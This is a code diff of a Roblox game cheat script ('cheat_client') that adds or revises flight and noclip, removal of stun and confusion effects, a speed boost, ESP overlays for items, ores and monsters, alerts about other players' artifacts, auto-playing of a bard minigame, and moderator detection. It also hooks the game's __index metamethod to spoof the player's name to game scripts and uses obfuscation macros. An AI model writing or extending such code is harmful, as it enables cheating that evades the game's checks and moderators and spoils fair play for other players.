                 end
-                transparent_parts = {}
                 
                 local nearbyParts = workspace:GetPartBoundsInRadius(rootPart.Position, DETECTION_RADIUS)
                 for _, part in ipairs(nearbyParts) do
@@ -10702,17 +22166,16 @@ if game.PlaceId == 100010170789226 then
             
             local function restorePartTransparency()
                 for part, originalTransparency in pairs(transparent_parts) do
-                    if part and part:IsA("BasePart") then
+                    if part and part.Parent and part:IsA("BasePart") then
                         part.Transparency = originalTransparency
                     end
+                    transparent_parts[part] = nil
                 end
-                transparent_parts = {}
             end
             
             function cheat_client:restore_state()
                 restorePartTransparency()
 
-                -- Check if trinket bot is running or if flight noclip was enabled
                 local is_bot_running = mem and mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true"
 
                 if (was_noclip_enabled or is_bot_running) and plr and plr.Character then
@@ -10759,7 +22222,7 @@ if game.PlaceId == 100010170789226 then
                             local camCFrame = workspace.CurrentCamera.CFrame
                             local huma = FindFirstChildOfClass(character, "Humanoid")
                             
-                            if true then -- flight is already checked at start
+                            if true then
                                 if isNoclipEnabled then
                                     makeNearbyPartsTransparent(plr.Character, rootPart)
                                     
@@ -10810,11 +22273,19 @@ if game.PlaceId == 100010170789226 then
                                 if not cheat_client.custom_flight_functions["GetFocusedTextBox"](uis) then
                                     local eVector = Vector3.new()
                                     local rVector, lVector, uVector = camCFrame.RightVector, camCFrame.LookVector, camCFrame.UpVector
-                
-                                    if cheat_client.custom_flight_functions["IsKeyDown"](uis, "W") then eVector += lVector end
-                                    if cheat_client.custom_flight_functions["IsKeyDown"](uis, "S") then eVector -= lVector end
-                                    if cheat_client.custom_flight_functions["IsKeyDown"](uis, "D") then eVector += rVector end
-                                    if cheat_client.custom_flight_functions["IsKeyDown"](uis, "A") then eVector -= rVector end
+
+                                    local flatLVector = Vector3.new(lVector.X, 0, lVector.Z)
+                                    if flatLVector.Magnitude > 0.01 then
+                                        flatLVector = flatLVector.Unit
+                                    else
+                                        flatLVector = Vector3.new(0, 0, 1)
+                                    end
+                                    local flatRVector = Vector3.new(rVector.X, 0, rVector.Z).Unit
+
+                                    if cheat_client.custom_flight_functions["IsKeyDown"](uis, "W") then eVector += flatLVector end
+                                    if cheat_client.custom_flight_functions["IsKeyDown"](uis, "S") then eVector -= flatLVector end
+                                    if cheat_client.custom_flight_functions["IsKeyDown"](uis, "D") then eVector += flatRVector end
+                                    if cheat_client.custom_flight_functions["IsKeyDown"](uis, "A") then eVector -= flatRVector end
                                     
                                     local isHoldingSpace = cheat_client.custom_flight_functions["IsKeyDown"](uis, "Space")
                                     if isHoldingSpace then eVector += uVector end
@@ -10865,12 +22336,11 @@ if game.PlaceId == 100010170789226 then
                             end
                         end
                     end
-                end))
+                end), true)
             end
 
             local function stop_flight_rendering()
                 if cheat_client.feature_connections.flight then
-                    -- Cleanup when disabling flight
                     if was_noclip_enabled then
                         cheat_client:restore_state()
                     end
@@ -10888,27 +22358,38 @@ if game.PlaceId == 100010170789226 then
             cheat_client.stop_flight_rendering = stop_flight_rendering
         end
 
-        do -- Init Character
-            local anti_status_connections = {}
-            local function setup_anti_status(character)
-                -- Disconnect old connections
-                if anti_status_connections.character_child_added then
-                    anti_status_connections.character_child_added:Disconnect()
+        do
+            local buff_connections = {}
+            local speed_object = nil
+
+            local function make_speed_object(character)
+                if character and FindFirstChild(character, "Boosts") then
+                    if speed_object and speed_object.Parent then
+                        speed_object:Destroy()
+                    end
+
+                    speed_object = Instance.new("IntValue")
+                    speed_object.Name = "SpeedBoost"
+                    speed_object.Value = (Toggles.speed_boost and Toggles.speed_boost.Value) and (Options.speed_boost_value and Options.speed_boost_value.Value or 16) or 0
+                    speed_object.Parent = character.Boosts
                 end
-                if anti_status_connections.boosts_child_added then
-                    anti_status_connections.boosts_child_added:Disconnect()
+            end
+
+            local function setup_buffs(character)
+                if buff_connections.character_child_added then
+                    buff_connections.character_child_added:Disconnect()
+                end
+                if buff_connections.boosts_child_added then
+                    buff_connections.boosts_child_added:Disconnect()
                 end
 
                 if not character then return end
 
                 local boosts = WaitForChild(character, "Boosts")
-
-                -- Anti Hystericus
                 if FindFirstChild(character, 'Confused') and Toggles and Toggles.AntiHystericus and Toggles.AntiHystericus.Value then
                     character.Confused:Destroy()
                 end
 
-                -- Mental Injury
                 for _,v in pairs(character:GetChildren()) do
                     if cheat_client.mental_injuries[v.Name] then
                         if Toggles and Toggles.NoInsanity and Toggles.NoInsanity.Value then
@@ -10917,58 +22398,115 @@ if game.PlaceId == 100010170789226 then
                     end
                 end
 
-                anti_status_connections.character_child_added = utility:Connection(character.ChildAdded, function(obj)
-                    -- Anti Hystericus
+                buff_connections.character_child_added = utility:Connection(character.ChildAdded, function(obj)
                     if obj.Name == 'Confused' and Toggles and Toggles.AntiHystericus and Toggles.AntiHystericus.Value then
                         task.defer(obj.Destroy, obj)
                         return
                     end
 
-                    -- Mental Injury
                     if cheat_client.mental_injuries[obj.Name] and Toggles and Toggles.NoInsanity and Toggles.NoInsanity.Value then
                         task.defer(obj.Destroy, obj)
                         return
                     end
 
-                    -- No Stun
                     if cheat_client.stuns[obj.Name] and Toggles and Toggles.NoStun and Toggles.NoStun.Value then
                         task.defer(obj.Destroy, obj)
                         return
                     end
                 end)
 
-                anti_status_connections.boosts_child_added = utility:Connection(boosts.ChildAdded, function(obj)
+                buff_connections.boosts_child_added = utility:Connection(boosts.ChildAdded, function(obj)
                     if obj.Name == "MusicianBuff" and obj.Value ~= "Symphony of Horses" and obj.Value ~= "Song of Lethargy" then
                         task.defer(obj.Destroy, obj)
                         return
                     end
 
-                    if obj.Name == "SpeedBoost" and Toggles and Toggles.NoStun and Toggles.NoStun.Value  then
+                    if obj.Name == "SpeedBoost" and Toggles and Toggles.NoStun and Toggles.NoStun.Value then
                         task.defer(obj.Destroy, obj)
                         return
                     end
                 end)
+
+                make_speed_object(character)
             end
 
             if plr.Character then
-                setup_anti_status(plr.Character)
+                setup_buffs(plr.Character)
             end
 
-            utility:Connection(plr.CharacterAdded, setup_anti_status)
+            utility:Connection(plr.CharacterAdded, setup_buffs)
+            if Toggles.speed_boost then
+                Toggles.speed_boost:OnChanged(function()
+                    if plr.Character then
+                        make_speed_object(plr.Character)
+                    end
+                end)
+            end
+
+            if Options.speed_boost_value then
+                Options.speed_boost_value:OnChanged(function()
+                    if Toggles.speed_boost and Toggles.speed_boost.Value and speed_object and speed_object.Parent then
+                        speed_object.Value = Options.speed_boost_value.Value
+                    end
+                end)
+            end
         end
     
-        do -- Init ESP
-            do -- Shrieker ESP
+        do
+            do
+                for _,object in next, ws:GetChildren() do
+                    if object.Name == "Part" and FindFirstChild(object, "ID") and cheat_client then
+                        local trinket_name, trinket_color, trinket_zindex = cheat_client:identify_trinket(object)
+                        cheat_client:add_trinket_esp(object, trinket_name, trinket_color, trinket_zindex)
+                    end
+                end
+            end
+
+            do
                 for _, child in pairs(ws.Live:GetChildren()) do
                     if child:IsA("Model") and string.match(child.Name, ".Shrieker") and FindFirstChild(child, "MonsterInfo") then
                         cheat_client:add_shrieker_chams(child)
                     end
                 end
             end
+
+            do
+                if game.PlaceId ~= 3541987450 then
+                    for index, instance in next, ws:GetChildren() do
+                        if ingredient_folder then 
+                            break
+                        end
+            
+                        if instance.ClassName == "Folder" then
+                            for index, ingredient in next, instance:GetChildren() do
+                                if ingredient.ClassName == "UnionOperation" and FindFirstChild(ingredient, "ClickDetector") and FindFirstChild(ingredient, "Blacklist") then
+                                    ingredient_folder = instance
+                                    break
+                                end
+                            end
+                        end
+                    end
+        
+                    if ingredient_folder then
+                        for _,object in next, ingredient_folder:GetChildren() do
+                            local ingredient_name = cheat_client:identify_ingredient(object)
+                            cheat_client:add_ingredient_esp(object, ingredient_name)
+                        end
+                    end
+                end
+            end
+    
+            do
+                if game.PlaceId ~= 14341521240 then
+                    for _,object in next, ws.Ores:GetChildren() do
+                        cheat_client:add_ore_esp(object)
+                    end
+                end
+            end
         end
     
-        do -- Init Bard
-            if FindFirstChild(plr.PlayerGui, "BardGui") then
+        do
+            if firesignal and FindFirstChild(plr.PlayerGui, "BardGui") then
                 utility:Connection(plr.PlayerGui.BardGui.ChildAdded, function(child)
                     if shared and Toggles and Toggles.auto_bard and Toggles.auto_bard.Value then
                         if child:IsA("ImageButton") and child.Name == "Button" then
@@ -10978,14 +22516,110 @@ if game.PlaceId == 100010170789226 then
                                 child.Parent.Enabled = true
                             end
                             task.wait(.9 + ((math.random(3, 11) / 100)))
-                            firesignal(child.MouseButton1Click)
+                            firesignal(child.MouseButton1Down)
                         end
                     end
                 end)
             end
         end
     
-        do -- Mod detection
+        do
+            if game.PlaceId ~= 14341521240 then
+                local artifact_player_connections = {}
+                local lastNotify = {}
+                local DEBOUNCE_TIME = 1.26
+
+                local function canNotify(player, artifact)
+                    lastNotify[player] = lastNotify[player] or {}
+                    local now = tick()
+                    if lastNotify[player][artifact] and (now - lastNotify[player][artifact]) < DEBOUNCE_TIME then
+                        return false
+                    end
+                    lastNotify[player][artifact] = now
+                    return true
+                end
+
+                local function check_artifacts(player)
+                    if library ~= nil and library.Notify then
+                        for _,v in pairs(player.Backpack:GetChildren()) do
+                            if table.find(cheat_client.artifacts, v.Name) and canNotify(player, v.Name) then
+                                library:Notify(
+                                    cheat_client:get_name(player).." ["..player.Name.."] has a "..v.Name,
+                                    Color3.fromRGB(255,0,179)
+                                )
+                            end
+                        end
+                    end
+                end
+
+                local function connect_artifact_player(player)
+                    if player == plr then return end
+
+                    if artifact_player_connections[player] then
+                        for _, conn in pairs(artifact_player_connections[player]) do
+                            conn:Disconnect()
+                        end
+                    end
+                    artifact_player_connections[player] = {}
+
+                    if player.Character then
+                        check_artifacts(player)
+                    end
+
+                    artifact_player_connections[player].backpackAdded = utility:Connection(player.Backpack.ChildAdded, function(child)
+                        if table.find(cheat_client.artifacts, child.Name) 
+                            and library ~= nil and library.Notify 
+                            and canNotify(player, child.Name) then
+                            library:Notify(
+                                cheat_client:get_name(player).." ["..player.Name.."] has a "..child.Name,
+                                Color3.fromRGB(255,0,179)
+                            )
+                        end
+                    end)
+
+                    artifact_player_connections[player].characterAdded = utility:Connection(player.CharacterAdded, function(character)
+                        check_artifacts(player)
+                    end)
+                end
+
+                local function disconnect_artifact_player(player)
+                    if artifact_player_connections[player] then
+                        for _, conn in pairs(artifact_player_connections[player]) do
+                            if conn and conn.Connected then
+                                conn:Disconnect()
+                            end
+                        end
+                        artifact_player_connections[player] = nil
+                    end
+                    lastNotify[player] = nil
+                end
+
+                for _,player in pairs(plrs:GetPlayers()) do
+                    if player.Character then
+                        connect_artifact_player(player)
+                    end
+                end
+
+                utility:Connection(plrs.PlayerAdded, function(player)
+                    if player.Character then
+                        connect_artifact_player(player)
+                    else
+                        local char_conn
+                        char_conn = utility:Connection(player.CharacterAdded, function(character)
+                            connect_artifact_player(player)
+                            if char_conn then
+                                char_conn:Disconnect()
+                                char_conn = nil
+                            end
+                        end)
+                    end
+                end)
+
+                utility:Connection(plrs.PlayerRemoving, disconnect_artifact_player)
+            end
+        end
+    
+        do
             for _,player in next, plrs:GetPlayers() do
                 task.spawn(cheat_client.detect_mod, cheat_client, player)
                 if player.Character then
@@ -10993,19 +22627,17 @@ if game.PlaceId == 100010170789226 then
                 end
 
                 utility:Connection(player.CharacterAdded, function(character)
-                    task.wait(0.5)  -- Wait for backpack to load
+                    task.wait(1)
                     task.spawn(cheat_client.detect_specs, cheat_client, player)
                 end)
             end
         end
     end
     
-    -- Connections
     do
-        do -- Player ESP Object Management
+        do
             cheat_client.player_esp_objects = cheat_client.player_esp_objects or {}
 
-            -- Create ESP for new players if ESP/chams are enabled
             utility:Connection(plrs.PlayerAdded, function(player)
                 if player ~= plr then
                     local esp_enabled = Toggles and Toggles.PlayerEsp and Toggles.PlayerEsp.Value
@@ -11020,7 +22652,6 @@ if game.PlaceId == 100010170789226 then
                 end
             end)
 
-            -- Clean up when players leave
             utility:Connection(plrs.PlayerRemoving, function(player)
                 if cheat_client.player_esp_objects[player] then
                     if cheat_client.player_esp_objects[player].destruct then
@@ -11030,8 +22661,63 @@ if game.PlaceId == 100010170789226 then
                 end
             end)
         end
+    
+        do
+            utility:Connection(ws.ChildAdded, function(object)
+                if object.Name == "Part" and FindFirstChild(object, "ID") and cheat_client then
+                    local trinket_name, trinket_color, trinket_zindex = cheat_client:identify_trinket(object)
+                    cheat_client:add_trinket_esp(object, trinket_name, trinket_color, trinket_zindex)
+                end
+            end)
 
-        do -- Shrieker Chams
+            utility:Connection(ws.ChildRemoved, function(object)
+                if cheat_client.trinket_esp_objects and cheat_client.trinket_esp_objects[object] then
+                    if cheat_client.trinket_esp_objects[object].destruct then
+                        cheat_client.trinket_esp_objects[object]:destruct()
+                    end
+                    cheat_client.trinket_esp_objects[object] = nil
+                end
+            end)
+        end
+    
+        do
+            if game.PlaceId ~= 3541987450 then
+                if ingredient_folder then
+                    utility:Connection(ingredient_folder.ChildAdded, function(object)
+                        local ingredient_name = cheat_client:identify_ingredient(object)
+                        cheat_client:add_ingredient_esp(object, ingredient_name)
+                    end)
+
+                    utility:Connection(ingredient_folder.ChildRemoved, function(object)
+                        if cheat_client.ingredient_esp_objects and cheat_client.ingredient_esp_objects[object] then
+                            if cheat_client.ingredient_esp_objects[object].destruct then
+                                cheat_client.ingredient_esp_objects[object]:destruct()
+                            end
+                            cheat_client.ingredient_esp_objects[object] = nil
+                        end
+                    end)
+                end
+            end
+        end
+    
+        do
+            if game.PlaceId ~= 14341521240 then
+                utility:Connection(ws.Ores.ChildAdded, function(object)
+                    cheat_client:add_ore_esp(object)
+                end)
+
+                utility:Connection(ws.Ores.ChildRemoved, function(object)
+                    if cheat_client.ore_esp_objects and cheat_client.ore_esp_objects[object] then
+                        if cheat_client.ore_esp_objects[object].destruct then
+                            cheat_client.ore_esp_objects[object]:destruct()
+                        end
+                        cheat_client.ore_esp_objects[object] = nil
+                    end
+                end)
+            end
+        end
+
+        do
             utility:Connection(ws.Live.ChildAdded, function(child)
                 if child:IsA("Model") and string.match(child.Name, ".Shrieker") then
                     cheat_client:add_shrieker_chams(child)
@@ -11039,30 +22725,28 @@ if game.PlaceId == 100010170789226 then
             end)
         end
 
-        do -- Character
+        do
             local character_debuff_connections = {}
+
             local function setupCharacterDebuffs(char)
-                -- Clean up old connections
                 for _, conn in pairs(character_debuff_connections) do
                     conn:Disconnect()
                 end
                 character_debuff_connections = {}
 
                 local boosts = WaitForChild(char, "Boosts")
+
                 character_debuff_connections[#character_debuff_connections + 1] = utility:Connection(char.ChildAdded, function(obj)
-                    -- Anti Hystericus
                     if obj.Name == 'Confused' and Toggles and Toggles.AntiHystericus and Toggles.AntiHystericus.Value then
                         task.defer(obj.Destroy, obj)
                         return
                     end
 
-                    -- Mental Injury
                     if cheat_client.mental_injuries[obj.Name] and Toggles and Toggles.NoInsanity and Toggles.NoInsanity.Value then
                         task.defer(obj.Destroy, obj)
                         return
                     end
 
-                    -- No Stun
                     if cheat_client.stuns[obj.Name] and Toggles and Toggles.NoStun and Toggles.NoStun.Value then
                         task.defer(obj.Destroy, obj)
                         return
@@ -11089,7 +22773,7 @@ if game.PlaceId == 100010170789226 then
             utility:Connection(plr.CharacterAdded, setupCharacterDebuffs)
         end
 
-        do -- Streamer Mode
+        do
             utility:Connection(ws.Live.ChildAdded, function(child)
                 if child:IsA("Model") and child.Name == plr.Name and shared and Toggles and Toggles.streamer_mode and Toggles.streamer_mode.Value then
                     task.spawn(function()
@@ -11102,12 +22786,11 @@ if game.PlaceId == 100010170789226 then
                         if game.PlaceId ~= 14341521240 then
                             repeat task.wait(0.025) until plr.Character and FindFirstChild(plr.Character, "FakeHumanoid",true)
                         end
-                        task.wait(0.025) -- 0.186
+                        task.wait(0.025)
                         cheat_client:apply_streamer(true)
 
-                        -- Re-apply day spoof after respawn
                         if cheat_client.config.spoof_days_enabled and cheat_client.config.custom_day_spoof then
-                            task.wait(0.1) -- Wait for StatGui to fully load
+                            task.wait(0.1)
                             cheat_client:spoof_days(cheat_client.config.custom_day_spoof)
                         end
                     end)
@@ -11115,58 +22798,228 @@ if game.PlaceId == 100010170789226 then
             end)
         end
     
-        do -- Bard
-            utility:Connection(plr.PlayerGui.ChildAdded, function(child)
-                if child.Name == "BardGui" then
-                    utility:Connection(child.ChildAdded, function(child)
-                        if shared and Toggles and Toggles.auto_bard and Toggles.auto_bard.Value then
-                            if child:IsA("ImageButton") and child.Name == "Button" then
-                                if Toggles and Toggles.hide_bard and Toggles.hide_bard.Value then
-                                    plr.PlayerGui.BardGui.Enabled = false
-                                else
-                                    child.Parent.Enabled = true
+        do
+            if firesignal then
+                local bard_button_connection = nil
+                utility:Connection(plr.PlayerGui.ChildAdded, function(child)
+                    if child.Name == "BardGui" then
+                        if bard_button_connection then
+                            pcall(function() bard_button_connection:Disconnect() end)
+                        end
+                        bard_button_connection = utility:Connection(child.ChildAdded, function(child)
+                            if shared and Toggles and Toggles.auto_bard and Toggles.auto_bard.Value then
+                                if child:IsA("ImageButton") and child.Name == "Button" then
+                                    if Toggles and Toggles.hide_bard and Toggles.hide_bard.Value then
+                                        plr.PlayerGui.BardGui.Enabled = false
+                                    else
+                                        child.Parent.Enabled = true
+                                    end
+                                    task.wait(.9 + ((math.random(3, 11) / 100)))
+                                    firesignal(child.MouseButton1Down)
                                 end
-                                task.wait(.9 + ((math.random(3, 11) / 100)))
-                                firesignal(child.MouseButton1Click)
                             end
-                        end
-                    end)
-                end
-            end)
-        end
-
-        do -- Invis cam
-            local isVolt = false
-            if identifyexecutor then
-                local executorName = identifyexecutor()
-                isVolt = executorName:lower():find("volt") ~= nil
-            end
-            
-            if not isVolt then
-                local oldIndex
-                oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, key)
-                    if not checkcaller() and self == plr then
-                        local callingScript = getcallingscript()
-                        
-                        if callingScript then
-                            local scriptName = callingScript.Name
-                            
-                            if key == "DevCameraOcclusionMode" and scriptName == "Input" then
-                                return Enum.DevCameraOcclusionMode.Zoom
-                            end
-                            
-                            if key == "CameraMaxZoomDistance" and scriptName == "Input" then
-                                return 50
-                            end
-                        end
+                        end)
                     end
-                    
-                    return oldIndex(self, key)
+                end)
+            else
+                local x
+                x = hookmetamethod(game, "__index", LPH_NO_VIRTUALIZE(function(self,key)
+                    if self == plr and key == "Name" and not checkcaller() and shared and Toggles and Toggles.auto_bard and Toggles.auto_bard.Value and getcallingscript().Parent and getcallingscript().Parent.Name == "BardGui" then
+                        return "Melon_Sensei"
+                    end
+                    return x(self,key)
                 end))
             end
         end
 
-        do -- Leaderboard Color System
+        do
+            if game.PlaceId == 5208655184 then
+                local function createSearchBar()
+                    if shared and shared.is_unloading then return end
+
+                    local playerGui = FindFirstChild(plr, "PlayerGui")
+                    if not playerGui then return end
+
+                    local startMenu = FindFirstChild(playerGui, "StartMenu")
+                    if not startMenu then return end
+
+                    local publicServers = FindFirstChild(startMenu, "PublicServers")
+                    if not publicServers then return end
+
+                    local sorts = FindFirstChild(publicServers, "Sorts")
+                    if not sorts then return end
+
+                    if FindFirstChild(sorts, "Search") then return end
+
+                    local function getServerInfoData()
+                        local jobIdToServerName = {}
+                        local jobIdToPlayers = {}
+                        local serverInfo = FindFirstChild(rps, "ServerInfo")
+                        if serverInfo then
+                            for _, jobIdFolder in pairs(serverInfo:GetChildren()) do
+                                if jobIdFolder:IsA("Folder") then
+                                    local jobId = jobIdFolder.Name
+                                    local serverNameValue = FindFirstChild(jobIdFolder, "ServerName")
+                                    if serverNameValue and serverNameValue:IsA("StringValue") then
+                                        jobIdToServerName[jobId:lower()] = serverNameValue.Value
+                                    end
+
+                                    local playersValue = FindFirstChild(jobIdFolder, "Players")
+                                    if playersValue and playersValue:IsA("StringValue") then
+                                        local success, playerData = pcall(function()
+                                            return Services.HttpService:JSONDecode(playersValue.Value)
+                                        end)
+                                        if success and playerData and type(playerData) == "table" then
+                                            jobIdToPlayers[jobId:lower()] = playerData
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                        return jobIdToServerName, jobIdToPlayers
+                    end
+
+                    local Search = Instance.new("TextBox")
+                    local Border = Instance.new("ImageLabel")
+
+                    Search.Name = "Search"
+                    Search.Parent = sorts
+                    Search.AnchorPoint = Vector2.new(0, 1)
+                    Search.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
+                    Search.BorderColor3 = Color3.fromRGB(27, 42, 53)
+                    Search.BorderSizePixel = 0
+                    Search.Position = UDim2.new(0, 135, 0, 5)
+                    Search.Size = UDim2.new(0, 330, 0, 20)
+                    Search.ZIndex = 2
+                    Search.ClearTextOnFocus = false
+                    Search.Font = Enum.Font.Bodoni
+                    Search.PlaceholderColor3 = Color3.fromRGB(22, 22, 22)
+                    Search.Text = ""
+                    Search.TextColor3 = Color3.fromRGB(27, 25, 23)
+                    Search.TextSize = 20.000
+                    Search.TextTransparency = 0.100
+
+                    Border.Name = "Border"
+                    Border.Parent = Search
+                    Border.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                    Border.BackgroundTransparency = 1.000
+                    Border.BorderColor3 = Color3.fromRGB(27, 42, 53)
+                    Border.BorderSizePixel = 0
+                    Border.Position = UDim2.new(0, -2, 0, -2)
+                    Border.Size = UDim2.new(1, 4, 1, 5)
+                    Border.ZIndex = 3
+                    Border.Image = "rbxassetid://2739347995"
+                    Border.ImageColor3 = Color3.fromRGB(245, 197, 130)
+                    Border.ScaleType = Enum.ScaleType.Slice
+                    Border.SliceCenter = Rect.new(5, 5, 5, 5)
+
+                    utility:Connection(Search:GetPropertyChangedSignal("Text"), function()
+                        if shared and shared.is_unloading then return end
+
+                        local text = Search.Text:match("^%s*(.-)%s*$"):lower()
+                        local scrollingFrame = FindFirstChild(publicServers, "ScrollingFrame")
+                        if not scrollingFrame then return end
+
+                        if text == "" then
+                            for _, server in pairs(scrollingFrame:GetChildren()) do
+                                if server:IsA("Frame") then
+                                    local serverName = FindFirstChild(server, "ServerName")
+                                    local serverRegion = FindFirstChild(server, "ServerRegion")
+                                    if serverName or serverRegion then
+                                        server.Visible = true
+                                    end
+                                end
+                            end
+                            return
+                        end
+
+                        local jobIdToServerName, jobIdToPlayers = getServerInfoData()
+                        local targetServerName = jobIdToServerName[text]
+                        for _, server in pairs(scrollingFrame:GetChildren()) do
+                            if server:IsA("Frame") then
+                                local serverNameObj = FindFirstChild(server, "ServerName")
+                                local serverRegion = FindFirstChild(server, "ServerRegion")
+
+                                if serverNameObj and serverRegion then
+                                    local matches = false
+
+                                    if targetServerName and serverNameObj.Text == targetServerName then
+                                        matches = true
+                                    elseif server.Name:lower():find(text) then
+                                        matches = true
+                                    elseif serverRegion.Text:lower():find(text) then
+                                        matches = true
+                                    else
+                                        for jobId, serverName in pairs(jobIdToServerName) do
+                                            if jobId:find(text) and serverNameObj.Text == serverName then
+                                                matches = true
+                                                break
+                                            end
+                                        end
+
+                                        if not matches then
+                                            local displayedServerName = serverNameObj.Text
+
+                                            for jobId, players in pairs(jobIdToPlayers) do
+                                                for _, playerInfo in ipairs(players) do
+                                                    if playerInfo.Name and playerInfo.Name:lower():find(text, 1, true) then
+                                                        local serverName = jobIdToServerName[jobId]
+                                                        if serverName and displayedServerName then
+                                                            local serverLower = serverName:lower()
+                                                            local displayLower = displayedServerName:lower()
+                                                            if serverLower:find(displayLower, 1, true) or
+                                                               displayLower:find(serverLower, 1, true) or
+                                                               serverLower == displayLower then
+                                                                matches = true
+                                                                break
+                                                            end
+                                                        end
+                                                    end
+                                                end
+                                                if matches then break end
+                                            end
+                                        end
+                                    end
+
+                                    server.Visible = matches
+                                end
+                            end
+                        end
+                    end)
+
+                    task.spawn(function()
+                        while Search and Search.Parent and shared and not shared.is_unloading do
+                            task.wait(1)
+                        end
+                        if Search and Search.Parent then
+                            pcall(function()
+                                Search:Destroy()
+                            end)
+                        end
+                    end)
+                end
+
+                task.spawn(function()
+                    task.wait(1)
+                    if Toggles and Toggles.public_server_search and Toggles.public_server_search.Value then
+                        createSearchBar()
+                    end
+                end)
+
+                utility:Connection(plr.PlayerGui.ChildAdded, function(child)
+                    if shared and shared.is_unloading then return end
+
+                    if child.Name == "StartMenu" then
+                        task.wait(0.5)
+                        if Toggles and Toggles.public_server_search and Toggles.public_server_search.Value then
+                            createSearchBar()
+                        end
+                    end
+                end)
+            end
+        end
+
+        do
             local tool_list = {
                 "Demon Step", "Axe Kick", "Demon Flip",
                 "Lightning Drop", "Lightning Elbow",
@@ -11337,8 +23190,14 @@ if game.PlaceId == 100010170789226 then
             local player_monitor_connections = {}
             local function updatePlayerLabels(player)
                 if playerLabels then
+                    local snapshot = {}
                     for label, p in pairs(playerLabels) do
                         if p == player then
+                            snapshot[label] = p
+                        end
+                    end
+                    for label in pairs(snapshot) do
+                        if playerLabels[label] then
                             updatePlayerLabel(player, label)
                         end
                     end
@@ -11346,7 +23205,6 @@ if game.PlaceId == 100010170789226 then
             end
 
             local function monitorPlayer(player)
-                -- Clean up old connections
                 if player_monitor_connections[player] then
                     for _, conn in pairs(player_monitor_connections[player]) do
                         conn:Disconnect()
@@ -11354,7 +23212,6 @@ if game.PlaceId == 100010170789226 then
                 end
                 player_monitor_connections[player] = {}
 
-                -- CharacterAdded
                 player_monitor_connections[player].characterAdded = utility:Connection(player.CharacterAdded, function(character)
                     task.wait(2)
 
@@ -11374,13 +23231,11 @@ if game.PlaceId == 100010170789226 then
                     updatePlayerLabels(player)
                 end)
 
-                -- CharacterRemoving
                 player_monitor_connections[player].characterRemoving = utility:Connection(player.CharacterRemoving, function()
                     task.wait(0.1)
                     updatePlayerLabels(player)
                 end)
 
-                -- Backpack.ChildAdded
                 if FindFirstChild(player, "Backpack") then
                     player_monitor_connections[player].backpackAdded = utility:Connection(player.Backpack.ChildAdded, function()
                         task.wait(1)
@@ -11388,7 +23243,7 @@ if game.PlaceId == 100010170789226 then
                     end)
                 end
 
-                if game.PlaceId == 100010170789226 then
+                if game.PlaceId == 5208655184 then
                     player_monitor_connections[player].maxEdictAttr = utility:Connection(player:GetAttributeChangedSignal("MaxEdict"), function()
                         updatePlayerLabels(player)
                     end)
@@ -11436,11 +23291,9 @@ if game.PlaceId == 100010170789226 then
                             for index, value in pairs(upvalues) do
                                 local player = nil
 
-                                -- Gaia: Check for string upvalue (player name)
                                 if type(value) == "string" then
                                     local username = value:gsub("\226\128\142", "")
                                     player = FindFirstChild(plrs, username)
-                                -- Khei: Check for Player object upvalue
                                 elseif typeof(value) == "Instance" and value:IsA("Player") then
                                     player = value
                                 end
@@ -11456,28 +23309,64 @@ if game.PlaceId == 100010170789226 then
                 end)
             end)
 
+            local leaderboard_connections = {}
+            local current_leaderboard_gui = nil
+
+            local function cleanupLeaderboardConnections()
+                for _, conn in pairs(leaderboard_connections) do
+                    pcall(function() conn:Disconnect() end)
+                end
+                leaderboard_connections = {}
+                current_leaderboard_gui = nil
+            end
+
             local function initializeLeaderboard()
-                if not FindFirstChild(plr.PlayerGui, "LeaderboardGui") then
+                local leaderboardGui = FindFirstChild(plr.PlayerGui, "LeaderboardGui")
+                if not leaderboardGui then
                     return
                 end
 
-                local leaderboardFrame = WaitForChild(plr.PlayerGui.LeaderboardGui, "MainFrame"):WaitForChild("ScrollingFrame")
+                if current_leaderboard_gui == leaderboardGui then
+                    return
+                end
+
+                cleanupLeaderboardConnections()
+                current_leaderboard_gui = leaderboardGui
+
+                local success, leaderboardFrame = pcall(function()
+                    return WaitForChild(leaderboardGui, "MainFrame", 5):WaitForChild("ScrollingFrame", 5)
+                end)
+
+                if not success or not leaderboardFrame then
+                    return
+                end
+
+                if not leaderboardGui.Parent then
+                    return
+                end
+
                 for _, label in ipairs(leaderboardFrame:GetChildren()) do
                     if label:IsA("TextLabel") then
                         processLeaderboardLabel(label)
                     end
                 end
 
-                utility:Connection(leaderboardFrame.ChildAdded, function(label)
+                leaderboard_connections[#leaderboard_connections + 1] = utility:Connection(leaderboardFrame.ChildAdded, function(label)
                     if label:IsA("TextLabel") then
                         task.wait(0.1)
                         processLeaderboardLabel(label)
                     end
                 end)
 
-                utility:Connection(leaderboardFrame.ChildRemoved, function(label)
+                leaderboard_connections[#leaderboard_connections + 1] = utility:Connection(leaderboardFrame.ChildRemoved, function(label)
                     if playerLabels[label] then
                         playerLabels[label] = nil
+                    end
+                end)
+
+                leaderboard_connections[#leaderboard_connections + 1] = utility:Connection(leaderboardGui.AncestryChanged, function(_, parent)
+                    if not parent then
+                        cleanupLeaderboardConnections()
                     end
                 end)
             end
@@ -11487,10 +23376,12 @@ if game.PlaceId == 100010170789226 then
                     task.wait(0.5)
                 end
 
+                task.wait(0.5)
                 initializeLeaderboard()
+
                 utility:Connection(plr.PlayerGui.ChildAdded, function(child)
                     if child.Name == "LeaderboardGui" then
-                        task.wait(0.5)
+                        task.wait(1)
                         initializeLeaderboard()
                     end
                 end)
@@ -11544,7 +23435,7 @@ if game.PlaceId == 100010170789226 then
             end)
         end
     
-        do -- Observe
+        do
             local THIS_SCRIPT = script
             local Spectating
 
@@ -11569,8 +23460,7 @@ if game.PlaceId == 100010170789226 then
                 connection = utility:Connection(plr.CharacterAdded, function()
                     newLB:Destroy()
                     connection:Disconnect()
-                    task.wait(1)  -- Delay to ensure clean timing before recreation
-                    -- Check if LeaderboardGui already exists, if not then create it
+                    task.wait(1)
                     local existingLB = FindFirstChild(plr.PlayerGui, LPH_ENCSTR('LeaderboardGui'))
                     if not existingLB then
                         local leaderboardSrc = FindFirstChild(sui, LPH_ENCSTR('LeaderboardGui'))
@@ -11611,7 +23501,6 @@ if game.PlaceId == 100010170789226 then
                     if not plr.Character and gui then
                         local function ensureLeaderboardGui()
                             if not FindFirstChild(gui, LPH_ENCSTR('LeaderboardGui')) then
